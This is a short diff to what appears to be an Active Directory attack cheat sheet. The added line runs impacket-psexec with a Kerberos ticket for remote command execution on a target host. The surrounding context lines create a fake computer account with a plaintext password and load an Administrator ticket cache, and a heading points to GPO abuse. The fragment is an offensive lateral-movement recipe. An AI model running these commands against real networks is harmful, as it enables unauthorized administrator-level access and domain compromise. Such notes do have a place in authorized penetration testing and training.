@@ -166,6 +166,7 @@ impacket-addcomputer ignite.local/geet:Password@1 -computer-name fakepc -compute
 # linux ticket environment
 ```bash
 export KRB5CCNAME=./Administrator.ccache
+impacket-psexec -no-pass -k <FQDN(computername.domain.name)>
 ```
 ---
 # GPO abuse
